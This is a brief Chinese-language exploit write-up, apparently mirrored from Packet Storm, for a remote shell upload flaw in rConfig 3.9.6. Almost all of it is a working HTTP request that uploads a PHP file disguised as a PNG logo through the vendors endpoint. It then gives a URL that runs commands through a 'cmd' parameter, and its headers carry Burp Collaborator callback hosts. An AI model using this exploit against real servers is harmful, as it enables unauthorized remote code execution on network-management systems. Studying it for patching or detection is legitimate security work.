# rConfig 3.9.6 远程 Shell Upload

rConfig版本3.9.6存在远程shell 上传漏洞。


```bash
POST /lib/crud/vendors.crud.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@5y4o1s35jvx342apl7392qrqxh3m7aw.burpcollaborator.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------122590832918963661283831488254
Content-Length: 36619
Origin: https://localhost
Connection: close
Referer: http://4hmnkrm42ug2n1to46m8lpapggmlp9e.burpcollaborator.net/ref
Cookie: PHPSESSID=eafcfe393af7dc2a3dd9bd1ea0e9e49b
Upgrade-Insecure-Requests: 1
Cache-Control: no-transform

-----------------------------122590832918963661283831488254
Content-Disposition: form-data; name="vendorName"

thisisrce
-----------------------------122590832918963661283831488254
Content-Disposition: form-data; name="vendorLogo"; filename="file.php"
Content-Type: image/png

<?php phpinfo(); ?>
-----------------------------122590832918963661283831488254
Content-Disposition: form-data; name="add"

add
-----------------------------122590832918963661283831488254
Content-Disposition: form-data; name="editid"


-----------------------------122590832918963661283831488254--
```


```
http(s)://<SERVER>/images/vendor/file.php?cmd=id
```

ref:

https://packetstormsecurity.com/files/161852/rConfig-3.9.6-Shell-Upload.html